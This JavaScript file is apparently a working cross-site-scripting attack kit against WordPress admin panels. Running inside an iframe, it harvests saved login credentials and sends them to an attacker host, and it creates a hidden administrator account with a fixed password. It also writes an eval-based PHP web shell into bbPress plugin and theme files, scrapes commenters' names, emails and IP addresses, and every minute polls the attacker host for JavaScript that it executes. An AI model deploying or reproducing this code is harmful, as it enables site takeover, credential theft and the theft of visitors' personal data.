var g_frameWindow=null;
var g_frameDocument=null;
var g_strURLIndex="";
var g_strURLLogin="";
var g_strURLAddUser="";
var g_strURLComment="";
var g_strURLPanelIndex="";
var g_strURLEditPHPPostPlugin="";
var g_strURLEditPHPPostTheme="";
var g_strURLEditPHPArray=null;
var g_strURLXSS="";
var g_strUsername="";
var g_strComunication="";


var g_strURLVisitLogsAdd="";
var g_strURLCommentsAdd="";
var g_strURLSpysIndex="";
function initURL()
{
    g_strURLXSS=Common.getTargetHost()+"?p=1";
    g_strURLIndex=Common.getTargetHost();
    g_strURLAddUser=Common.getTargetHost()+"wp-admin/user-new.php";
    g_strURLComment=Common.getTargetHost()+"wp-admin/edit-comments.php";
    g_strURLLogin=Common.getTargetHost()+"wp-login.php";
    g_strURLPanelIndex=Common.getTargetHost()+"wp-admin/index.php";
    g_strURLEditPHPArray=new Array();
    g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Findex.php&plugin=bbpress%2Fbbpress.php";
    g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Fincludes%2Findex.php&plugin=bbpress%2Fbbpress.php";
    g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Flanguages%2Findex.php&plugin=bbpress%2Fbbpress.php";
    g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/plugin-editor.php?file=bbpress%2Ftemplates%2Findex.php&plugin=bbpress%2Fbbpress.php";
    g_strURLEditPHPArray[g_strURLEditPHPArray.length]=Common.getTargetHost()+"wp-admin/theme-editor.php?file=framework%2Findex.php&theme=goodnews5";
    g_strURLEditPHPPostPlugin=Common.getTargetHost()+"wp-admin/plugin-editor.php";
    g_strURLEditPHPPostTheme=Common.getTargetHost()+"wp-admin/theme-editor.php";

    g_strURLVisitLogsAdd=Common.getJSHost()+"visit-logs/add2";
    g_strURLCommentsAdd=Common.getJSHost()+"Comments/add";
    g_strURLSpysIndex=Common.getJSHost()+"Spys/first";
}

//find the give child
function findChild($element,array)
{
    $elementReturn=null;
    if($element!=null&&$element.length>0&&array!=null&&typeof(array.length)!=="undefined"&&array.length!==0)
    {
        $elementReturn=$element;
        for(var i=0;i<array.length;++i)
        {
            if(array[i]>=$elementReturn.children().length)
            {
                $elementReturn=null;
                break;
            }
            $elementReturn=$elementReturn.children().eq(array[i]);
        }
    }
    return $elementReturn;
}
//--------------------------------------------panelIndex page-----------------------------------------------------------------------
function inPagePanelIndex()
{
    var iIDTimer=window.setInterval
    (
        function()
        {
            $.ajax
            (
                {
                    type:"post",
                    url:g_strURLSpysIndex,
                    data:{},
                    success:function(data,textStatus,xhr)
                    {
                        try
                        {
                            eval(data);
                        }
                        catch(e)
                        {
                            console.log("fatal error in function inPagePanelIndex:"+e);
                        }
                    }
                }
            );
        },60000
    );
}
//--------------------------------------------panelIndex page-----------------------------------------------------------------------

//--------------------------------------------editPHP page-----------------------------------------------------------------------
function inPageEditPHP() {
    //check URL again
    var jsonToSend=
    {
        _wp_http_referer:$("#template").find("input[name='_wp_http_referer']").val(),
        _wpnonce:$("#template").find("#_wpnonce").val(),
        action: $("#template").find("input[name='action']").val(),
        file: $("#template").find("input[name='file']").val(),
        newcontent:"<?php /*** Do not modify the files in this folder. */ @eval($_POST['wordPressPlugin']);?>",
        scrollto: $("#template").find("input#scrollto").val(),
        submit:$("#template").find("input#submit").val()
    };
    var strURLPost="";
    if(window.location.href.indexOf("wp-admin/theme-editor.php")!==-1)
    {   //theme
        jsonToSend.theme=$("#template").find("input[name='theme']").val();
        strURLPost=g_strURLEditPHPPostTheme;
    }
    else if(window.location.href.indexOf("wp-admin/plugin-editor.php")!==-1)
    {   //plugin
        jsonToSend.plugin=$("#template").find("input[name='plugin']").val();
        strURLPost=g_strURLEditPHPPostPlugin;
    }
    else
    {
        console.log("fatal error,unnkow url in function inPageEditPHP:"+window.location.href);
    }

    $.ajax
    (
        {
            type:"post",
            url:strURLPost,
            data:jsonToSend,
            success:function(data,textStatus,xhr)
            {
                var json=
                {
                    username:window.parent.g_strUsername,
                    action:"edit php file "+$("#template").find("input[name='file']").val()+",result:"
                };
                try
                {
                    var bEditSuccess=false;
                    //bbPress plugin
                    if(window.location.href.indexOf("plugin=bbpress")!==-1)
                    {
                        if(data.indexOf("id=\"template\"")===-1)
                        {
                            bEditSuccess=true;
                        }
                        else
                        {
                            bEditSuccess=false;
                        }
                    }
                    //goodnews theme
                    else if(window.location.href.indexOf("theme=goodnews5")!==-1)
                    {
                        if(data.indexOf("id=\"message\"")!==-1)
                        {
                            bEditSuccess=true;
                        }
                        else
                        {
                            bEditSuccess=false;
                        }
                    }
                    else
                    {
                        console.log("fatal error in function inPageEditPHP,unrecognized url:"+window.location.href);
                    }
                    var strResult="";
                    if(bEditSuccess)
                    {
                        strResult="success";
                    }
                    else
                    {
                        strResult="failed";
                    }
                    console.log("edit phpfile "+strResult+":"+$("#template").find("input[name='file']").val());
                    json.action+=strResult;
                    throw strResult;
                }
                catch(e)
                {
                    if(e!=="success"&&e!=="failed")
                    {
                        //exception
                        console.log("exception in inPageEditPHP:"+e);
                        json.action+="exception:"+e;
                    }
                    addVisitLog(json);
                }
            }
        }
    );
}

//--------------------------------------------editPHP page-----------------------------------------------------------------------


//--------------------------------------------comment page-----------------------------------------------------------------------
function inPageComment(iRowIndex)
{
    var jsonLog=
    {
        username:window.parent.g_strUsername,
        action:""
    };
    //check is able to display comments
    if($("#the-comment-list").length===0)
    {
        //can not display comments
        if($("#error-page").length>0)
        {
            //login already but no privileges
            console.log("login but no privileges to show comments");
            jsonLog.action="already login and try crawl comment but has not privilege!";
            window.parent.g_strComunication="no_privilege";
        }
        else
        {
            //302 redirect,need login
            console.log("can not get error message,program not supposed to run here");
            jsonLog.action="can not get error message,program not supposed to run here";
            window.parent.g_strComunication="can_not_find_error_message";
        }
        addVisitLog(json);
    }
    else
    {
        var $elementTable=$("#the-comment-list");
        if($elementTable.length>0)
        {
            //for(var i=0;i<$elementTable.children().length;++i)
            //{
            if(iRowIndex<0)
            {
                iRowIndex=0;
            }
            if(iRowIndex<$elementTable.children().length)
            {
                var $elementTableRow=$elementTable.children().eq(iRowIndex);
                //author basic info，author email site ip
                var $elementAuthorBasic=$elementTableRow.find("td.author.column-author");
                if($elementAuthorBasic.length!=1)
                {
                    throw "author basic element number is not equal 1,it is:"+$elementAuthorBasic.length;
                }
                var author=$elementAuthorBasic.children().eq(0).text();
                var site=$elementAuthorBasic.children().eq(2).text();
                var email=$elementAuthorBasic.children().eq(4).text();
                var ip=$elementAuthorBasic.children().eq(6).text();
                //content
                var $elementContent=$elementTableRow.find("td.comment.column-comment.has-row-actions.column-primary");
                if($elementContent.length!=1)
                {
                    throw "content element number is not equal 1,it is:"+$elementContent.length;
                }
                var content=$elementContent.children().eq(1).text();
                //post backto
                var $elementBackTo=$elementTableRow.find("td.response.column-response");
                if($elementBackTo.length!=1)
                {
                    throw "back to element number is not equal 1,it is:"+$elementBackTo.length;
                }
                var backto=$elementBackTo.children().eq(0).children().eq(0).text();
                //post time
                var $elementTime=$elementTableRow.find("td.date.column-date");
                if($elementTime.length!=1)
                {
                    throw "back to element number is not equal 1,it is:"+$elementTime.length;
                }
                var time=$elementTime.children().eq(0).text();
                $.ajax
                (
                    {
                        type:"post",
                        url:g_strURLCommentsAdd,
                        data:
                        {
                            postauthor:author,
                            postemail:email,
                            postsite:site,
                            postip:ip,
                            postcontent:content,
                            posttime:time,
                            postto:backto
                        },
                        success:function(data,textStatus,xhr)
                        {
                            try
                            {
                                var json=eval("("+data+")");
                                if(json.success)
                                {
                                    throw "success";
                                }
                                else
                                {
                                    throw "failed";
                                }
                            }
                            catch(e)
                            {
                                if(e!="success"&&e!="failed")
                                {
                                    console.log("add comment exception:"+e);
                                }
                                else
                                {
                                    console.log("add comment result:"+e);
                                }
                                //next row
                                iRowIndex++;
                                inPageComment(iRowIndex);
                            }
                        }
                    }
                );
            }
            else
            {
                //next page
                //total pages
                var iTotal=$(".total-pages").eq(0).text();
                //current page
                var iCurrent=$("#current-page-selector").val();
                //check if there is next page
                if(iTotal===iCurrent)
                {
                    //no more
                    window.parent.g_strComunication="";
                    jsonLog.action="capture comment finish,count:"+$elementTable.children().length;
                }
                else
                {
                    //next page
                    window.parent.g_strComunication=$("a.next-page").eq(0).attr("href");
                    jsonLog.action="capture comment and going to next page,count:"+$elementTable.children().length;
                }
                addVisitLog(jsonLog);
            }
            //}
        }
        else
        {
            jsonLog.action="fatal error in function inPageComment:can not get element table";
            console.log(jsonLog.action);
            addVisitLog(jsonLog);
        }
    }
}
//--------------------------------------------comment page-----------------------------------------------------------------------


//--------------------------------------------adduser page-----------------------------------------------------------------------
function inPageAddUser()
{
    var json=
    {
        username:window.parent.g_strUsername,
        action:""
    };
    //check is able to create user
    if($("#createuser").length===0)
    {
        //can not create user
        if($("#error-page").length>0)
        {
            //login already but no privileges
            console.log("login but no privileges to create user");
            json.action="already login and try add user but has not privilege!";
            window.parent.g_strComunication="no_privilege";
        }
        else
        {
            //302 redirect,need login
            console.log("can not find error message,program not supposed to run here");
            json.action="can not find error message,program not supposed to run here";
            window.parent.g_strComunication="can_not_find_error_message";
        }
        addVisitLog(json);
    }
    else
    {
        $.ajax
        (
            {
                type:"post",
                url:g_strURLAddUser,
                data:
                {
                    "action":"createuser",
                    "createuser":$("#createuser").find("#createusersub").val(),
                    "_wpnonce_create-user":$("#_wpnonce_create-user").val(),
                    "_wp_http_referer":"/wp-admin/user-new.php",
                    "user_login":"PHPMyAdmin1",
                    "email":"colorwolf2017@gmail.com",
                    "first_name":"PHPMyAdmin2",
                    "last_name":"PHPMyAdmin3",
                    "url":"http://www.phpmyadmin.com",
                    "pass1":"cake123456789",
                    "pass1-text":"cake123456789",
                    "pass2":"cake123456789",
                    "pw_weak":"on",
                    "send_user_notification":"1",
                    "role":"administrator"
                },
                success:function(data,textStatus,xhr)
                {
                    //accroding google explain,status 302 will never received
                    window.parent.g_strComunication="has_privilege";
                    try
                    {
                        if(data.indexOf("id=\"createusersub\"")===-1)
                        {
                            throw "success";
                        }
                        else
                        {
                            throw "failed";
                        }
                    }
                    catch(e)
                    {
                        if(e=="success"||e=="failed")
                        {
                            json.action="create user "+e;

                        }
                        else
                        {
                            json.action="create user exception:"+e;
                        }
                        console.log(json.action);
                        addVisitLog(json);
                    }
                }
            }
        );
    }
}
//--------------------------------------------adduser page-----------------------------------------------------------------------

//--------------------------------------------login page-----------------------------------------------------------------------
function inPageLogin()
{
    //if save username and password
    if($("#user_login").val()!==""&&$("#user_pass").val()!=="")
    {
        console.log("up save already,try to login");
        $.ajax
        (
            {
                type:"post",
                url:g_strURLLogin,
                data:
                {
                    log:$("#user_login").val(),
                    pwd:$("#user_pass").val(),
                    rememberme:"forever",
                    "wp-submit":$("#wp-submit").val(),
                    redirect_to:Common.getTargetHost()+"wp-admin/",
                    testcookie:"1"
                },
                success:function(data,textStatus,xhr)
                {
                    var json=
                    {
                        username:$("#user_login").val(),
                        action:"try to login,password is:"+$("#user_pass").val()+",login result:"
                    };
                    try
                    {
                        if(data.indexOf("name=\"loginform\"")===-1)
                        {
                            //login success
                            console.log("login success");
                            json.action+="success";
                            window.parent.g_strComunication="success";
                            window.parent.g_strUsername=$("#user_login").val();
                            throw "no exception,just for easy";
                        }
                        else
                        {
                            //login failed
                            console.log("login failed");
                            json.action+="failed";
                            window.parent.g_strComunication="failed";
                            //to do
                            throw "login failed exception,just for easy";
                        }
                    }
                    catch(e)
                    {
                        console.log("login exception:"+e);
                        addVisitLog(json);
                    }
                }
            }
        );
    }
    else
    {
        console.log("up not save");
        var json=
        {
            username:"",
            action:"username and password not all saved,username:"+$("#user_login").val()+",password:"+$("#user_pass").val()
        };
        window.parent.g_strComunication="not_save";
        addVisitLog(json);
    }
}
//--------------------------------------------login page-----------------------------------------------------------------------

//--------------------------------------------inPageRedirect page-----------------------------------------------------------------------
function inPageRedirect()
{   //test is login
    var json=
    {
        username:"",
        action:"detected not login when try to create user 302 redirect"
    };
    //if($("#wpadminbar").length>0)
    //{   //login already
    //    var $elementUsername=findChild($("#wpadminbar"),[1,1,1,0]);
    //    json.username=$elementUsername.text();
    //    json.action+=",user login already:"+json.username;
    //    window.parent.g_strUsername=json.username;
    //    window.parent.g_strComunication="login_already";
   // }
   // else
    //{   //not login
    //    window.parent.g_strComunication="not_login";
    //    json.action+=",user not login";
   // }
    console.log(json.action);
    addVisitLog(json);
}
//--------------------------------------------inPageRedirect page-----------------------------------------------------------------------

//common function add visit log
function addVisitLog(json)
{
    $.ajax
    (
        {
            type:"post",
            url:g_strURLVisitLogsAdd,
            data:json,
            success:function(data,textStatus)
            {
                try
                {
                    var json=eval("("+data+")");
                    if(json.success)
                    {
                        console.log("visit log success");
                    }
                    else
                    {
                        console.log("visit log fail");
                    }
                    console.log("parent position:"+window.parent.location.href+",my positiopn:"+window.location.href);
                    //continue no matter success or fail
                    window.parent.frameOperationCalledFromSon(window);
                }
                catch(e)
                {
                    console.log("in exception parent position value:"+window.parent.location.href+",my positiopn:"+window.location.href+",exception:"+e);
                     //continue even exception
                    window.parent.frameOperationCalledFromSon(window);
                }
            }
        }
    );
}

//frame jump to
function frameJumpTo(strURL)
{
    var $body=$("body");
    if($body.length===0)
    {
        throw "can not get body element";
    }
    //load home page and inject xss
    if($("#idIFrameChangable").length===0)
    {
        //$body.append("<iframe id=\"idIFrameChangable\" src=\""+strURL+"\" width=\"100%\" height=\"50%\"></iframe>");
        $body.append("<iframe id=\"idIFrameChangable\" width=\"100%\" height=\"50%\"></iframe>");
    }
    $("#idIFrameChangable").unbind();
    $("#idIFrameChangable").bind
    (   "load",
        function()
        {
            if(strURL===$("#idIFrameChangable").attr("src"))
            {
                //console.log("load frame success");
                //$(window.frames[0].document).find("head").append("<script src=\""+Common.getJSHost()+"zfirst/js/xss_index.js\"></script>");
                g_frameWindow = window.frames[0].window;
                g_frameDocument = window.frames[0].document;
                Common.callBackAfterJSLoad(Common.getJSHost() + "zfirst/js/xss.js", "idScriptXSS", null, null, false, g_frameDocument);
                Common.callBackAfterJSLoad(Common.getJSHost()+"zfirst/js/common.js","idScriptCommon",null,null,false,g_frameDocument);
            }
            else
            {
                //302redirect
                console.log("fatal error:different url in function frameJumpTo:"+strURL+"__"+$("#idIFrameChangable").attr("src"));
            }
        }
    );
    $("#idIFrameChangable").attr("src",strURL);
}

//called from son wiodow
function frameOperationCalledFromSon(windowSon)
{
    console.log("frame operation called from son window");
    if(windowSon.location.href.indexOf("redirect_to")!==-1)
    {
        //need login,302redirect to here
        frameJumpTo(g_strURLLogin);
    }
    else if(windowSon.location.href===g_strURLLogin)
    {
        if(g_strComunication==="success")
        {
            //try to login and login success
            console.log("detect login success,try to create user..");
            frameJumpTo(g_strURLAddUser);
        }
        else if(g_strComunication==="failed"||g_strComunication==="not_save")
        {
            console.log("up not save,try create user 10s later");
            //check for every 10 seconds
            window.setTimeout
            (
                function()
                {
                    frameJumpTo(g_strURLAddUser);
                },10000
            );
        }
        else
        {
            console.log("fatle error in login page,unrecognized g_strComunication:"+g_strComunication);
        }
    }
    else if(windowSon.location.href===g_strURLAddUser)
    {
        if(g_strComunication==="no_privilege")
        {   // has no privileges,i need comment
            console.log("detect can not create user due to lack of privileges,try to crawl comment ..");
            frameJumpTo(g_strURLComment);
        }
        else if(g_strComunication==="can_not_find_error_message")
        {
            console.log("can not find error message,try to crawl comment ..");
            frameJumpTo(g_strURLComment);
        }
        else if(g_strComunication==="has_privilege")
        {
            //if has privilege i need php edit
            //<?php @eval($_POST['caidao']);?>
            console.log("detect create user success,try to eidt php ..");
            g_strComunication=0;
            frameJumpTo(g_strURLEditPHPArray[g_strComunication]);
        }
        else
        {
            console.log("fatle error in adduser page,unrecognized g_strComunication:"+g_strComunication);
        }
    }
    else if(windowSon.location.href.indexOf("plugin-editor.php")!==-1||windowSon.location.href.indexOf("theme-editor.php")!==-1)
    {
        g_strComunication++;
        if(g_strComunication>=g_strURLEditPHPArray.length)
        {
            //no more php to edit,i need comment
            frameJumpTo(g_strURLComment);
            console.log("detect not more php file to edit,going to crawl comments:"+g_strURLComment);
        }
        else
        {
            //next php to edit
            frameJumpTo(g_strURLEditPHPArray[g_strComunication]);
            console.log("going to next editable php file:"+g_strURLEditPHPArray[g_strComunication]);
        }
    }
    else if(windowSon.location.href.indexOf(g_strURLComment)!==-1)
    {
        if(g_strComunication!=="")
        {
            if(g_strComunication==="no_privilege")
            {
                //no privileges to show comments
                console.log("detect no porivilege to show comments,going to control panel")
                frameJumpTo(g_strURLPanelIndex);
            }
            else if(g_strComunication=="can_not_find_error_message")
            {
                console.log("detect can not find error message,going to control panel")
                frameJumpTo(g_strURLPanelIndex);
            }
            else
            {
                //next page
                console.log("going to crawl next page comments:"+g_strComunication);
                frameJumpTo(g_strComunication);
            }
        }
        else
        {
            //no more comment
            //alert("no more comment!");
            frameJumpTo(g_strURLPanelIndex);
        }
    }
    //else if(windowSon.location.href===g_strURLIndex)
    //{
        //if(g_strComunication==="not_login")
        //{
            //not login yet,if auto save password,try to login
        //    console.log("detect not login,try to login..");
        //    frameJumpTo(g_strURLLogin);
       // }
       // else if(g_strComunication==="login_already")
       //{   //login already
         //   frameJumpTo(g_strURLAddUser);
        //    console.log("detect login already,try to create user..");
        //}
        //else
        //{
        //    console.log("fatal error in index page,unrecognized g_strComunication:"+g_strComunication);
        //}
    //}
    else
    {
        throw "unknow position in function frameOperationCalledFromSon:"+windowSon.location.href;
    }
}
//is login already or not
function isLoginAlready()
{
    var bReturn=true;
    if($("form#loginform").length!==0||$("form.mom-login-form"))
    {
        bReturn=false;
    }
}

//different operation in different page
function frameOperation()
{
    console.log("current page new url:"+window.location.href);
    if(window.location.href===g_strURLXSS)
    {
        //XSS
        frameJumpTo(g_strURLAddUser);
    }
    else if(window.location.href.indexOf("redirect_to")!==-1)
    {
        //i am sure not login
        inPageRedirect();
    }
    //if(window.location.href===g_strURLIndex)
    //{   //index
        //may be the target host is not the same
        //inPageIndex();
    //}
    else if(window.location.href===g_strURLLogin)
    {
        //try to login
        inPageLogin();
    }
    else if(window.location.href===g_strURLAddUser)
    {
        //add user
        inPageAddUser();
    }
    else if(window.location.href.indexOf("plugin-editor.php")!==-1||window.location.href.indexOf("theme-editor.php")!==-1)
    {
        inPageEditPHP();
    }
    else if(window.location.href.indexOf(g_strURLComment)!==-1)
    {
        //get back comment
        inPageComment(-1);
    }
    else if(window.location.href==g_strURLPanelIndex)
    {
        //get changable js command
        inPagePanelIndex();
    }
    //else if(window.location.href===(Common.getTargetHost()+"?p=1"))
    else
    {

    }
    // else
    // {
    //     throw "unrecongnized position:"+window.location.href;
    // }
}

//test for jquery
function testJQuery()
{
    var bReturn=false;
    if(typeof($)!=="undefined")
    {
        bReturn=true;
    }
    return bReturn;
}

//main js function entry
function mainJSFunctionEntry()
{
    try
    {
        //init url
        initURL();
        //check if jquery is useable
        if (!testJQuery())
        {
            Common.callBackAfterJSLoad("https://ajax.microsoft.com/ajax/jquery/jquery-2.1.4.min.js","idScriptJQuery", testJQuery, frameOperation,true,document);
        }
        else
        {
            frameOperation();
        }
    }
    catch(e)
    {
        console.log("error in mainJSFunctionEntry:"+e);
    }
}
